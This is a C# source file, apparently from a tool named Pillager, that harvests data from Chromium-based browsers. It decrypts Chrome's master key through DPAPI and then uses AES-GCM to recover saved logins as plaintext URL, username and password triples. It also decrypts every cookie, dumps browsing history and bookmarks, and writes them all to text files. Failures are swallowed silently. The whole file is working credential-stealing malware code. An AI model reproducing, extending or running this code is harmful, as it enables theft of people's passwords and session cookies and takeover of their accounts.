using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Pillager.Helper;

namespace Pillager.Browsers
{
    public class Chrome
    {
        private string BrowserPath { get; set; }

        public string BrowserName { get; set; }

        private byte[] MasterKey { get; set; }

        public Chrome(string Name,string Path)
        {
            BrowserName = Name;
            BrowserPath = Path;
            MasterKey = GetMasterKey();
        }

        public byte[] GetMasterKey()
        {
            string filePath = Path.Combine(Directory.GetParent(BrowserPath).FullName, "Local State");
            byte[] masterKey = new byte[] { };
            if (!File.Exists(filePath))
                return null;
            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));
            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value));
            }
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);
            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }

        private byte[] DecryptData(byte[] buffer)
        {
            byte[] decryptedData = null;
            if (MasterKey is null) return null;
            try
            {
                string bufferString = Encoding.Default.GetString(buffer);
                if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
                {
                    byte[] iv = buffer.Skip(3).Take(12).ToArray();
                    byte[] cipherText = buffer.Skip(15).ToArray();
                    byte[] tag = cipherText.Skip(cipherText.Length - 16).ToArray();
                    cipherText = cipherText.Take(cipherText.Length - tag.Length).ToArray();
                    decryptedData = new AesGcm().Decrypt(MasterKey, iv, null, cipherText, tag);
                }
                else
                {
                    decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                }
            }
            catch { }

            return decryptedData;
        }

        public string Chrome_passwords()
        {
            StringBuilder passwords = new StringBuilder();
            string loginDataPath = Path.Combine(BrowserPath, "Login Data");
            if (!File.Exists(loginDataPath))
            {
                return null;
            }

            try
            {
                string tempLoginDataPath = Path.GetTempFileName();

                File.Copy(loginDataPath, tempLoginDataPath, true);

                SQLiteHandler handler = new SQLiteHandler(tempLoginDataPath);

                if (!handler.ReadTable("logins"))
                    return null;

                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string url = handler.GetValue(i, "origin_url");
                    string username = handler.GetValue(i, "username_value");
                    string crypt = handler.GetValue(i, "password_value");

                    string password = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));

                    if (url!=null &&url!=""&& username != null && username != "" &&
                        !(password is null) && password.Length > 0)
                    {
                        passwords.Append("\t[URL] -> {" + url + "}\n\t[USERNAME] -> {" + username + "}\n\t[PASSWORD] -> {" + password + "}\n");
                    }
                }

                File.Delete(tempLoginDataPath);
            }
            catch { }

            return passwords.ToString();
        }

        public string Chrome_history()
        {
            StringBuilder history = new StringBuilder();
            string chrome_History_path = Path.Combine(BrowserPath, "History");
            if (!File.Exists(chrome_History_path))
            {
                return null;
            }
            try
            {
                string cookie_tempFile = Path.GetTempFileName();
                File.Copy(chrome_History_path, cookie_tempFile, true);
                SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                if (!handler.ReadTable("urls"))
                    return null;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string url = handler.GetValue(i, "url");
                    history.Append("\t{" + url + "}");
                }
                File.Delete(cookie_tempFile);
            }
            catch { }


            return history.ToString(); ;
        }

        public string Chrome_cookies()
        {
            StringBuilder cookies = new StringBuilder();
            string chrome_cookie_path = Path.Combine(BrowserPath, "Cookies");
            string chrome_100plus_cookie_path = Path.Combine(BrowserPath, "Network\\Cookies");
            if (!File.Exists(chrome_cookie_path) == true) chrome_cookie_path = chrome_100plus_cookie_path;
            if (!File.Exists(chrome_cookie_path))
            {
                return null;
            }
            try
            {
                string cookie_tempFile = Path.GetTempFileName();
                File.Copy(chrome_cookie_path, cookie_tempFile, true);
                SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                if (!handler.ReadTable("cookies"))
                    return null;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string host_key = handler.GetValue(i, "host_key");
                    string name = handler.GetValue(i, "name");
                    string crypt = handler.GetValue(i, "encrypted_value");

                    string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
                    cookies.Append("\t[" + host_key + "] \t {" + name + "}={" + cookie + "}");
                }

                File.Delete(cookie_tempFile);
            }
            catch { }

            return cookies.ToString();
        }

        public string Chrome_books()
        {
            StringBuilder stringBuilder = new StringBuilder();
            string chrome_book_path = Path.Combine(BrowserPath, "Bookmarks");
            if (File.Exists(chrome_book_path))
            {
                stringBuilder.Append(File.ReadAllText(chrome_book_path));
            }
            return stringBuilder.ToString();
        }

        public void Save(string path)
        {
            if (MasterKey==null)
            {
                return;
            }
            string savepath = Path.Combine(path, BrowserName);
            Directory.CreateDirectory(savepath);
            string cookies = Chrome_cookies();
            string passwords = Chrome_passwords();
            string books = Chrome_books();
            string history = Chrome_history();
            File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
            File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
            File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
            File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
        }
    }
}
